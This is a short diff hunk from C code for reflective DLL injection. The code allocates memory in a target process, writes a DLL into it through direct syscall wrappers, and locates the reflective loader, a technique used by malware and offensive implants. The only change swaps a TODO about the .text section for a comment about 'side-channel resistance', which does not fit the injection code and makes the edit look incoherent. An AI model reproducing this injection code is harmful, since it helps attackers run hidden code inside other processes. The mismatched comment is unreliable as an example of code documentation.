@@ -263,7 +263,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         PUTS( "[+] NtAllocateVirtualMemory: success" );
         if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
-            // TODO: check to get the .text section and size of it
+            // TODO: evaluate side-channel resistance of this implementation
             PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );
 
             ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
